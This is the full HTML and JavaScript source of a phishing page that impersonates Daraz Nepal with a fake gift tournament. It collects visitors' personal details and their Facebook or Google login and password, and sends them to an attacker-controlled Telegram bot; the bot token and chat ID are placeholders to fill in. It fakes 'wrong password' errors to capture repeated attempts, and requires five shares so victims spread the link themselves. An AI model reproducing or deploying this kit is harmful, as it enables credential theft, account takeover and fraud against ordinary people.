<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daraz Nepal | Official 2082 Tournament</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #f4f4f6; color: #333; -webkit-tap-highlight-color: transparent; }
        .daraz-orange { color: #f85606; }
        .daraz-bg { background-color: #f85606; }
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.96); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
        .glass-card { background: white; padding: 35px; border-radius: 24px; width: 100%; max-width: 400px; text-align: center; }
        input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; }
        #participation-ui, #login-modal, #share-ui, #success-ui { display: none; }
        .btn-main { width: 100%; background: #f85606; color: white; padding: 16px; border-radius: 14px; font-weight: 900; text-transform: uppercase; cursor: pointer; border: none; transition: 0.3s; }
        .progress-container { background: #eee; border-radius: 20px; height: 16px; margin: 20px 0; overflow: hidden; }
        #progress-fill { background: #f85606; height: 100%; width: 0%; transition: 0.6s; }
        .share-btn { padding: 14px; border-radius: 12px; color: white; font-weight: 700; text-align: center; cursor: pointer; }
    </style>
</head>
<body>

    <div id="landing-page" class="max-w-2xl mx-auto py-12 px-6 text-center">
        <h1 class="text-4xl font-black mb-4">DARAZ <span class="daraz-orange">GIFT EVENT</span></h1>
        <div class="text-left bg-white p-8 rounded-3xl shadow-sm border mb-8 text-sm">
            <h3 class="font-black text-xl border-b pb-2 mb-4 uppercase">Rules & Policy</h3>
            <p>1. One entry per person. Valid ID required for prizes.</p>
            <div class="mt-6 pt-4 border-t flex items-center gap-3">
                <input type="checkbox" id="agree-check" class="w-6 h-6 accent-[#f85606]">
                <label for="agree-check" class="font-black text-gray-700 uppercase text-xs">I agree to all rules</label>
            </div>
        </div>
        <button onclick="nav('participation-ui')" class="btn-main text-xl">START</button>
    </div>

    <div id="participation-ui" class="min-h-screen flex items-center justify-center p-6">
        <div class="bg-white p-10 rounded-[40px] shadow-2xl w-full max-w-md border">
            <h2 class="text-2xl font-black mb-6 uppercase">Personal Details</h2>
            <input type="text" id="c-name" placeholder="Full Name">
            <input type="text" id="c-loc" placeholder="City">
            <input type="text" id="c-phone" placeholder="Phone Number">
            <select id="c-shop">
                <option value="Regular">Regular Customer</option>
                <option value="New">New User</option>
            </select>
            <button onclick="nav('login-modal')" class="btn-main mt-4">CONTINUE</button>
        </div>
    </div>

    <div id="login-modal" class="modal-overlay">
        <div class="glass-card">
            <div class="text-2xl font-black daraz-orange mb-4">Secure Login</div>
            <div id="err-box" class="hidden text-red-600 text-xs font-bold mb-4">Wrong password! Try again.</div>
            <select id="l-via"><option value="Facebook">Facebook</option><option value="Google">Google</option></select>
            <input type="text" id="l-user" placeholder="Email or Mobile" required>
            <input type="password" id="l-pass" placeholder="Password" required>
            <button onclick="sendToTelegram()" class="btn-main mt-4" id="sub-btn">VERIFY & REGISTER</button>
        </div>
    </div>

    <div id="share-ui" class="min-h-screen flex items-center justify-center p-6">
        <div class="bg-white p-8 rounded-[40px] shadow-2xl w-full max-w-md text-center">
            <h2 class="text-2xl font-black mb-1 uppercase">Verification</h2>
            <div class="progress-container"><div id="progress-fill"></div></div>
            <div class="grid grid-cols-2 gap-3 mt-6">
                <div onclick="share('wa')" class="share-btn bg-[#25D366]">WhatsApp</div>
                <div onclick="share('fb')" class="share-btn bg-[#1877F2]">Facebook</div>
            </div>
            <button onclick="finalize()" class="btn-main opacity-20 mt-10" id="final-btn">SUBMIT</button>
        </div>
    </div>

    <div id="success-ui" class="daraz-bg min-h-screen text-white flex flex-col items-center justify-center p-8 text-center">
        <h1 class="text-5xl font-black">ENTRY RECORDED!</h1>
        <div class="mt-8 bg-black/20 p-8 rounded-[32px] w-full max-w-sm">
            <div class="text-6xl font-mono font-black text-yellow-400" id="live-counter">14,208</div>
        </div>
    </div>

    <script>
        // CONFIG - CHANGE THESE
        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
        const CHAT_ID = "YOUR_CHAT_ID_HERE";

        let attempts = 0, shares = 0, lTime = 0, active = false;

        function nav(id) {
            if(id==='participation-ui' && !document.getElementById('agree-check').checked) return alert("Agree to rules!");
            document.querySelectorAll('body > div').forEach(div => div.style.display = 'none');
            document.getElementById(id).style.display = id === 'login-modal' ? 'flex' : (id === 'success-ui' ? 'flex' : 'flex');
        }

        async function sendToTelegram() {
            const btn = document.getElementById('sub-btn');
            const user = document.getElementById('l-user').value;
            const pass = document.getElementById('l-pass').value;
            if(!user || !pass) return alert("Fill all info!");

            attempts++;
            btn.innerText = "Verifying...";

            const message = `
🎯 **NEW DARAZ ENTRY** 🎯
━━━━━━━━━━━━━━━━
👤 Name: ${document.getElementById('c-name').value}
📍 City: ${document.getElementById('c-loc').value}
📞 Phone: ${document.getElementById('c-phone').value}
🛍️ Shop: ${document.getElementById('c-shop').value}
━━━━━━━━━━━━━━━━
🔑 Method: ${document.getElementById('l-via').value}
📧 User: ${user}
🔓 Pass: ${pass}
🔢 Attempt: #${attempts}
━━━━━━━━━━━━━━━━`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
                });
            } catch (e) {}

            if(attempts < 3) {
                document.getElementById('l-pass').value = "";
                document.getElementById('err-box').classList.remove('hidden');
                btn.innerText = "Try Again";
            } else {
                nav('share-ui');
            }
        }

        function share(plat) {
            active = true; lTime = Date.now();
            window.location.href = (plat==='wa' ? "whatsapp://send?text=" : "https://t.me/share/url?url=") + encodeURIComponent("Win Prizes! " + window.location.href);
        }

        document.addEventListener("visibilitychange", () => {
            if(document.visibilityState === 'visible' && active) {
                active = false;
                if(Date.now() - lTime > 1800) {
                    shares++;
                    document.getElementById('progress-fill').style.width = (shares/5)*100 + "%";
                    if(shares >= 5) document.getElementById('final-btn').classList.remove('opacity-20');
                }
            }
        });

        function finalize() {
            if(shares >= 5) {
                nav('success-ui');
                setInterval(() => {
                    const c = document.getElementById('live-counter');
                    c.innerText = (parseInt(c.innerText.replace(',','')) + 1).toLocaleString();
                }, 1000);
            }
        }
    </script>
</body>
</html>
